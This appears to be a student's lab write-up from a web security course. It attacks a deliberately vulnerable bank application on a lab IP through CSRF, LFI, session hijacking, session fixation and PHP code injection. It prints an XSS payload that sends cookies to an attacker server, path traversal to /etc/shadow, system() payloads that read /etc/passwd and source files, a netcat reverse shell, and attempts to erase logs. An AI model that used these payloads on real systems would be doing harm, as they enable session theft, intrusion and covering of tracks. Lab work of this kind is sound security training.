Web Application Vulnerabilities -2

### Exercise 1: Cross Site Request Forgery (CSRF/XSRF)

#### Task 1
__Q__ 1. Briefly explain what CSRF/XSRF is in your own words (outline the roles and steps involved in XSRF attack).

__Solution__

- Cross-site-request-forgery (CSRF)- is an attack where the malicious website exploits trust between the web browser and the authenticated user's website which is vulnerable
- Unauthorized requests or commands are run on behalf of victim on the vulnerable website
-  Assume a vulnerable website that allows to run commands(like funds transfer), containing a url for that funds transfer. So when the user hits `transfer funds` with appropriate parameters, request gets executed succussfully

- Steps invloved:
    - Setup a malcious website
    - Create a script or source(like, `img` tags, `iframe`) that executes the request to transfer funds.
    - Allow the  authenticated victim to access the malicous website
    - Send the fund transfer request . (Since the victim is authenticated and the URL/script is crafted to transfer funds, cookies stored on victim's broswer also be sent)
    - Request gets sent on behalf of malicous users so the  request procesess successfully.


#### Task 2

__Q: What is the difference between XSS and CSRF/XSRF from their execution perspective?__  
__Solution:__ If a website is vulnerable to stored XSS, execution of commands on behalf of victim is easy and does'nt require to setup a malicous website. In case of Cross-site request forgery,, the excution requires, the authentication victim from vulnerable website to visit the malicouis website setup by the attacker in order to execute the commands/requests.


#### Task 3

__Q: Briefly explain why your bank is theoretically vulnerable to CSRF/XSRF attack!__  
__Solution:__ After examining the web request, on `Transfer Funds` page , the website doesn't seem to send  any unique identifier or tokens , that identify the request as being originated from the same domain, or performed by the actual user.

![funds_transfer](images/task2/funds_transfer.PNG)


#### Task 4

__Assume that you are a valid customer of your bank. Show how you can use XSRF
to transfer money from another account to your account.__




#### Task 5.
__5. Enhance your last attack such that it automatically spreads to other accounts and transfers your money from them too. Briefly explain your attack.__


<br></br>
<hr></hr>

<br></br>
### Exercise 2: Server-Side Request Forgery(SSRF)

__1. Briefly explain in your own words what is SSRF vulnerability and common SSRF attacks and what are the common SSRF defences circumventing__

__Solution__ SSRF(Server side request forgery) is a web server vulnerability where an attacker tricks the sever to execute a request. with a specially crafted request, one can control the server to request a URL, usually crafted with a publicly accessible URL, thus giving the partial or full control on server requests.

__2. What is the difference between SSRF and CSRF/XSRF from their execution
perspective?__

__Solution:__ CSRF targets the user, to trick or executes malicious links/requests,and send it to server on behalf of them, where as SSRF invloves specifically targeting the server, that is vulnerable in handling user requests. Although in both cases, its the server that is vulnerable, the victim is different in CSRF and SSRF attacks.  


### Exercise 3: Local File Inclusion (LFI)

__1. Briefly explain what is a Local File Inclusion (LFI) vulnerability? By using a simple
example, describe how do LFIs work and how to avoid this vulnerability? Show
a vulnerable code and apply your patch to it.__
__Solution:__  Local File Inclusion (LFI) ia web vulnerability, where an attacker tricks the web application to dynamically load files from from the web server that are available locally.

*Example:* When an application receives an unsantitized user input,  and processed, which exposes local files because of the input that directly constructs the file path, which is included in response

sample vulnerable code

```php

    echo "File included: ".$_REQUEST["page"]."<br>";
    echo "<br><br>";
    $local_file = $_REQUEST["page"];
    echo "Local file to be used: ". $local_file;
    echo "<br><br>"
    include $local_file;

```

How it works:

- The application uses file path as an input
- user input is treated as trusted and safe
- A local file can be inlcuded as a result of user specified input to the file include
- Application returns the file contnets as response

![Example diagram]()


**Avoiding the Vulnerability**
    - Common and effective solution is to avoid allowing user submitted input to the application API.
    - An application can also have allowed list of files to include (whitelisting fioles and directories that can be included), any other input or file names can be rejected.




- **Fix: Whitelisting file**
    ```php
     $allowed_files = array('index','transfer', 'accounts'); //list of files that are allowed to be included 
     $local_file = $_REQUEST["page"];
     if(in_array($_GET['file'], $allowed_files)) { //check if the requested file is in allowed array list
        include ($_GET['file']. '.php')
    }
    ```

    > It is also best, that none of the  allowedd_files can be modified by attacker, epecially with file uploads where the attacker has control over file names


__2. How do you identify and exploit LFI? Describe it with a simple example.__

- Look for page includes or file names as URL parameters like'
    ```php
         http://www.vbank.com/file.php?file=transfer.php 
    ```
- change file by changing the file inlcude or file path URL
- Traverse through directory to look for local files and observe the  response from the application
 
- example..
    ```javascript
        http://www.vbank.com/file.php?file=../etc/shadow  //does'nt work
    ```

    ```javascript
        http://www.vbank.com/file.php?file=../../etc/shadow // does'nt work
    ```
    ```javascript
        http://www.vbank.com/file.php?file=../../../etc/shadow // shows the shadow file
    ```
- If the file path is true and the application does;nt filter and file is availbale in local to the server, contents can be displayed on the browser as a response
- The lack of input validation and filtering for files allow to read aribitary file contents.


__3. Briefly explain what is Remote File Inclusion (RFI) and how can you minimise the risk of RFI attacks? And LFI vs. RFI?__  
__Solution:__  
- Remote File Inclusion (RFI) web vulnerability where user editable input is used to include other files in execution flow of the application script.
- If that input is not sanitized, that can lead to arbitary files being inlcuded by the attacker.
- In PHP, `include`,`include_once`, `require`, `require_once` lead to such vulnerabilities.
- Typical Vulnerable code.

    ```php
        echo "File included is :". $_REQUEST["file"]."<br>";
        echo "<br><br>";
        include $_REQUEST["file"];
    ```

- **LFI Vs RFI**
    - Every RFI is a LFI, the only difference is that in RFI, the attacker can supply his own file to the target application and execute whereas, in LFI, user supplied file/input is limited to the application server local.

- For RFI to work, `allow_url_include` must be turned `On` in PHP configuration (located in `php.ini`). This can be turned `Off` to minimize the risk of fetching remote files. Usially on default installation this is turned `Off`.
- Another way to minize the risk, is to whitelist files and directories, and sanitize user supplied input just like remote File Inclusion.


### Exercise 4: Session Hijacking


__1. Install a webserver on your machine. Use it to write a script that will read the
information required to hijack a session. Briefly describe your script.__
__Solution:__ 
    - Installed Python  and run the webserver module
```bash
    $ python3 -m http.server
        Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```  
- Initiate multiple funds transfer with following remarks
> Multiple transfers are required as the remarks input is limited to 100 characters after encoding the contnets in it. For that reason, **payload is staged**.
- Remarks in transfer 1:
```javascript
<script>var c=document.cookie;</script>
```
- Remarks in transfer 2:
```javascript
<script>const Http = new XMLHttpRequest();</script>
```
- Remarks in transfer 3:
```javascript
<script>const u='http://192.168.37.128:8000/'+x;</script>
```
- Remarks in ransfer 4:
```javascript
<script>Http.open("GET", url);Http.send();</script>
```
- The above scripts is an ajax call to attacker server running on `192.168.37.128:8000`, that sends the cookie value `c`
    The above remarks make up the following
    ```javascript
    <script>
        var c=document.cookie;  //store cookie in variable c
        const Http = new XMLHttpRequest();
        var u='http://192.168.37.128:8000/'+x; // aoppend cookie value to url
        Http.open("GET", url);
        Http.send();
    </script>
    ```

- The request for the above script can be seen in attacker's server logs
    ```bash
        └─$ python3 -m http.server
            Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
            192.168.37.128 - - [08/May/2021 09:05:16] "GET / HTTP/1.1" 200 -
            192.168.37.128 - - [08/May/2021 09:05:16] code 404, message File not found
            192.168.37.128 - - [08/May/2021 09:05:16] "GET /USECURITYID=v155sm5645ckoddmdpepcubbc4 HTTP/1.1" 404 -
    ```
- From the logs we can observe the request contents `USECURITYID=v155sm5645ckoddmdpepcubbc4` which we know that , is a cookie value.



__2. Use the implementation from the last step to hijack the session of a customer of your bank. Briefly describe the steps to perform this attack.__
__solution:__

- Copy the `USECURITYID=v155sm5645ckoddmdpepcubbc4` that is captured on the server log
- Install `EditThisCookie` extension from chrome https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=en
- Open the login page of the application in private window 
- Past the cookie  value, into the `Value` field.
![edit_this_cookie](images/task2/edit_this_cookie.PNG)
- Click on Green tick below the window
- Reload the page
- Should be logged in as user
- **Result**


    ![hijacked_session_alex](images/task2/hijacked_session.PNG)


__3. Which possible implementation mistakes enable your attack?__
__Solution :__
1. Application is vulnerable to XSS(unsanitized user input at `Remarks` field), thus leveraging it to steal cookies.
2. Cross domain requests are possible(allowing it to send request to attacker's site), no `Same-Origin-Policy` is implemented.
3. No `HttpOnly` flag, as this tells the browser not to display access cookies through client side scripts


__4. How would https influence it?__
__Solution:__ `https` has no significant influence in this case, as the attacker can still access the cookie(as it is stored un-encrypted) and send it over to attacker's server. However this would be beneficial if the attacker is in same network as user and  try to steal cookies,as  the data is sent encrypted. 
> If cookies are sent in headers `secure` flag should be set, to indicate the browser that cookie can only be sent in `https` requests.

__5. Implement some precautions which can prevent or mitigate this attack?__
__Solution:__
1. Sanitize user input to avaoiud any injection into the application.
2. set `Http Only` flag to avoid cookies being accessed  by client side scripts
3. use `https` connections
4. Implement `Same Origin Policy`, as it can prevent sending sending request  other domains.




### Exercise 5: Session Fixation

__1. Explain the difference to Session Hijacking.__
__Solution :__ In Session Fixation, the attacker forces the user to use the session of his choice, where in   Session Hijacking , the logged in user session is hijacked.

__2. Sketch an attack that allows you to take over the session of a bank user.__
__Solution :__
- Found two approches in hijacking a session using session fixation.
1. Manual way, setting the broswer cookie to dewsired value with key being `USECURITYID` (assuming that attacker has physical access to victim's browser)
2. Stored XSS(on `Funds Transfer` page) attack to set the cookie value.

**Approach 1**
- **step 1**: Open `EditThiCookie` extension and click on import.
- **step 2:** Use the following payload to set the cookie value
```javascript
[
{
    "domain": "192.168.37.128", //domain name or IP
    "expirationDate": 1621190036.198929,
    "hostOnly": true,
    "httpOnly": false,
    "name": "USECURITYID",
    "path": "/",
    "sameSite": "unspecified",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "abcdefghi",  //fixed value for name 'USECURITYID'
    "id": 1
}
]
```
 ![cookie_fixing](images/task2/cookie_fixing.PNG)
 
-  Allow the user to log in 
***Before Log in***
![fixation_before_login](images/task2/fixation_before_login.PNG)

***After Log in*** Same cookie value exists.

![fixation_after_login](images/task2/fixation_after_login.png)


 - **step 3**: In another browser use the same cookie values to import it to `EditThisCookie` extension
- **step 4** Reload the page.

 **Result** : Session successfully hijacked using the fixed cookie value



 ![hijack_after_fixation](images/task2/hijack_after_fixation.PNG)


 **Approach 2**
- Using stored XSS to set the cookie
    - **step 1** Initiate funds transfer to the victim
    - **step 2** use the following payload in `remarks` field and click on transfer
        ```javascript
        <script>document.cookie="USECURITYID=abcde";<script>
        ```
    ![set_cookie_in_remarks](images/task2/set_cookie_in_remarks.PNG)
    - **step 3** allow the Victim to login and view `My Accounts`. (Opening the victim account in another browser and click on `Account Details`)
    ![fixation_using_xss](images/task2/fixation_using_xss.PNG)
    - We can observe that `USECURITYID` is set twice, one after user login and another using xss.
    - As attacker without useing the log in functionality. Insert the cookie value into the browser(use `EditThisCookie` extension to import the key, value or simply add the `Name`, `value`, `Domain` fields in `Developer Tools` => `Application`,as seen in the figure.)
    - **step 4** Reload the page. and account should be logged in as Victim. Thus hiacking a logged in user session with fixed `cookie value`

**[Attacker's browser after editing the cookie value to `abcde` and reloading.]**

![attacker_machine_after_fixation](images/task2/attacker_machine_after_fixation.PNG)


another approach
- setting the cookie value using HTTP header response by intercepting the traffic between web server and client's browser.

__3. How can you generally verify that an application is vulnerable to this type of attack?__
__solution:__
- Set the cookie value to random string(usually similar length or format as actual cookie value) before  logging in to the application.
- Now login to the application.
- Observe the cookie value set  after login by the application in developer tools => storage.
- If the cookie value is same as set before login and no new cookie name,values or parameters are added and the account is still logged in, then we can confirm that application is vulnerable to session fixation attack.



__4. Does https influence your attack?__
__Solution :__ `https` has No influence on carrying out the session fixation attack, as the cookie values can be set in various ways, encrypting the traffic or running the application over secure protocol has no effect.


__5. Accordingly, which countermeasure is necessary to prevent your attacks?
Patch your system and test it against Session Fixation again.__

<!-- NOTE   finish -->
__Solution__ session_rengenerate()



### Exercise 6: Remote Code Injection

__1. Find a section that allows you to inject and execute arbitrary code (PHP). Document your steps and explain why does it allow the execution?__
__solution :__
1. Found user input on `htbdetails` > `Account details` page, where arbitary code injection is possible.
 After analysing the source code:
```php
$replaceWith =  "preg_replace('#\b". str_replace('\\',
                '\\\\', $http['query']) ."\b#i', '<span
                class=\"queryHighlight\">\\\\0</span>','\\0')";
```
preg_replace function is in strings and input is part of the string, terminated using `'` and injected php code and opened `'` for the continueing string

payload:
```php
    ' . phpinfo() .'
```
> `.` is used to concatenate to the string

that breaks the following query
```php
$replaceWith =  "preg_replace('#\b". str_replace('\\',
                '\\\\', $http['query']) ."\b#i', '<span
                class=\"queryHighlight\">\\\\0</span>','\\0')";
```
into

```php
preg_replace('#\b'. phpinfo() .'\b#i', '\\0','\0')
```
```php
$replaceWith =''.phpinfo().'';  //without markup
```

- **Result**
![Code execution - phpinfo](images/task2/phpinfo.PNG)


__2. Disclose the master password for the database your bank application has access to. Indicate username, password and DB name as well as the IP address of the machine this database is running on.__
__solution__




__4. Assume you are running a server with virtual hosts. Can you disclose the password for another bank database and can you access it? Explain which potential risk does this vulnerability imply for virtual hosts?__
__Solution__
Yes, as the code injection can lead to server takeover, it is possible to view database and passwords of all the bank acounts running on root host.
Since the settings(`example.conf`) can be modified(Assuming the taken over account has write permissions).

> usually database is same for all sub-domains in the application, unless the database is different for each virtual host, there are chances that vulnerable vhost has no to minimum impact on accessing other databases.

If one virtual host is exploitable(code injection) that lead to other subdomain take over because of remote code injection vulnerability in one, which is a potential risk in vhosts.
- Even though attacker may not have access to other subdomains intially, vulnerable subdomain(which attacker has access to) leads to other sub-domain take over.


__5. Display /etc/passwd of the web server, the bank application is running on. Try
different methods to achieve this goal. Explain why some methods cannot be
successful.__
__solution__

- payload used:
    ```php
        '. system("cat/etc/passwd") .'
    ```
- Result:

    ![etc_passwd_displaying](images/task2/etc_passwd.PNG)

- other methods used/tried:(not successful)

```php
    ' . echo include_once('/etc/passwd') . '
```

```php
    ' . show_source("../../../../../../../etc/passwd", true) . '
```

```php
    ' .  echo file_get_contents("../../../../../../../etc/passwd"); . '
```

the above methods are un-successfull as they are executing on server side but not as a response that can be viewed in browser.


__6. Show how to “leak” the complete source files of your web application. Briefly describe, how you accomplished this.__
__solution :__
- since  command execution on `htbdetails` > `Account details` page is possible, we used system commands to display the source files

- Leaking index page
    - payload used 
        ```php
        '. system("cat index.php") .'
        ```
    - Application URL
        ```javascript
        http://192.168.37.128/htdocs/index.php?account=173105291&page=
        htbdetails&query=%27.+system%28%22cat+index.php%22%29+.%27&
        submit=Submit+Query
        ```
    -  **Result**

        ![leak_source_1](images/task2/leak_source_1.PNG)
        <br></br>

- Leaking login.php page
    - payload used
    ```php
    '. system("cat login.php") .'
    ```
    - Application URL 
        ```javascript
        http://192.168.37.128/htdocs/index.php?account=173105291page=htbdetails
        &query=%27.+system%28%22cat+login.php%22%29+.%27&submit=Submit+Query
        ```
    - **Result**
    ![leak_source_2](images/task2/leak_source_2.PNG)


__7. Suppose you are an anonymous attacker:
a) Upload a web shell on the victim server and show that you can take
control of the server.
b) Deface the main bank page.
c) Clear possible traces that could lead to you.__
__solution :__

**a**). Used `netcat` for creating a reverse connection from victim machine
- payload used:
```php
    '. system("nc -e /bin/sh 192.168.37.128 1234") .'
```

- On attcker machine (listen on corresponding port - 1234)
```bash
    $ sudo nc -lvnp  1234  
```
- **Result** (received connection from victim)
![reverse_shell](images/task2/reverse_shell.PNG)

**b**). look for file permissions of index page (navigate to /var/www/html/htdocs)
```bash
$ ls -la
ls -la
total 40
drwSr-sr-x 3 root  root 4096 May 10 07:23 .
drwxr-xr-x 6 root  root 4096 May 12 10:15 ..
-rw-rw-rw- 1 mysql root  141 May 10 07:23 file
-rw-r--r-- 1 root  root 6791 Apr  6  2014 htb.css
-rw-r--r-- 1 root  root  591 Apr  6  2014 htb.js
drwxr-xr-x 3 root  root 4096 Mar 20  2014 images
-rw-r--r-- 1 root  root 7080 May 12 11:06 index.php
-rw-r--r-- 1 root  root 1997 May 10 05:34 login.php

```

> `index.php` is not writeable- hence defacing the obrtained account is not possible


**c**). Escaping tty shell for better readability in terminal
- payload used:
    ```bash
    python -c 'import pty; pty.spawn("/bin/sh")'
    ```
- locating bash_history
    ```bash
    $ locate bash_history
    locate bash_history
    /home/kali/.bash_history
    $ cd /home/kali/
    ```
- look for permissions
    ```bash
    $ ls -la | grep bash

    -rw-r--r--  1 kali kali      1 Mar  3 16:41 .bash_history
    -rw-r--r--  1 kali kali    220 Feb 23 05:36 .bash_logout
    -rw-r--r--  1 kali kali   4705 Feb 23 05:36 .bashrc
    -rw-r--r--  1 kali kali   3526 Feb 23 05:36 .bashrc.original
    ```
    > Since .bash_history is not writable, deleting is not possible

- locating other log files
    ```bash
    $ locate log | grep apache
        /etc/apache2/conf-available/other-vhosts-access-log.conf
        /etc/apache2/conf-enabled/other-vhosts-access-log.conf
        /etc/apache2/mods-available/log_debug.load
        /etc/apache2/mods-available/log_forensic.load
        /etc/logrotate.d/apache2
        /usr/lib/apache2/modules/mod_log_debug.so
        /usr/lib/apache2/modules/mod_log_forensic.so
        /usr/share/apache2/icons/openlogo-75.png
        /usr/share/doc/apache2/changelog.Debian.gz
        /usr/share/doc/apache2/changelog.gz
        /usr/share/doc/apache2-bin/changelog.Debian.gz
        /usr/share/doc/apache2-bin/changelog.gz
        /usr/share/doc/apache2-data/changelog.Debian.gz
        /usr/share/doc/apache2-utils/changelog.Debian.gz
        /usr/share/doc/apache2-utils/changelog.gz
        /usr/share/doc/libapache-pom-java/changelog.Debian.gz
        /var/lib/apache2/conf/enabled_by_maint/other-vhosts-access-log
        /var/log/apache2

    ```
- navigate to /var/log/
    ```bash
    $ cd /var/log
    ```
- look for file permissions
    ```bash
    ls -la
    total 5500
    drwxr-xr-x  19 root     root               4096 May 22 04:44 .
    drwxr-xr-x  12 root     root               4096 Apr 16 16:32 ..
    -rw-r--r--   1 root     root              25060 May 22 08:54 Xorg.0.log
    -rw-r--r--   1 root     root              54260 May 19 04:44 Xorg.0.log.old
    -rw-r--r--   1 root     root              24191 May 15 06:21 Xorg.1.log
    -rw-r--r--   1 root     root              24195 May 15 05:31 Xorg.1.log.old
    -rw-r--r--   1 root     root                516 May  4 10:15 alternatives.log
    -rw-r--r--   1 root     root               1680 Apr 28 06:12 alternatives.log.1
    -rw-r--r--   1 root     root               6567 Mar  9 10:10 alternatives.log.2.gz
    drwxr-x---   2 root     adm                4096 May 19 04:04 apache2
    drwxr-xr-x   2 root     root               4096 May 15 19:06 apt
    -rw-r-----   1 root     adm               67039 May 22 08:55 auth.log
    -rw-r-----   1 root     adm              316551 May 16 04:35 auth.log.1
    -rw-r-----   1 root     adm               11047 May  8 15:39 auth.log.2.gz
    -rw-r-----   1 root     adm               10748 May  1 18:55 auth.log.3.gz
    -rw-r-----   1 root     adm                5532 Apr 25 04:22 auth.log.4.gz
    -rw-------   1 root     root               5501 May 19 04:45 boot.log
    -rw-------   1 root     root               5501 May 14 02:51 boot.log.1
    -rw-------   1 root     root               5501 Apr 30 07:39 boot.log.2
    -rw-------   1 root     root               6759 Apr 25 04:22 boot.log.3
    -rw-------   1 root     root               5451 Apr 19 00:49 boot.log.4
    -rw-------   1 root     root              66466 Apr  2 05:52 boot.log.5
    ```
    > ALl the files found are not writeable by service account `www` which we exploited.


<br></br><br></br>
<br></br>
<br></br>
<br></br>
<br></br>
1. initiate transfer
1a clear current cookie set expires (document.cookie = "USECURITYID=abcde; expires= Thu, 21 Aug 2014 20:00:00 UTC;"
)
2. set docikument cookie to your own value
3. inject the cookie  in attacker browser
4 attacker should now has session same as victim
<br></br><br></br><br></br><br></br><br></br>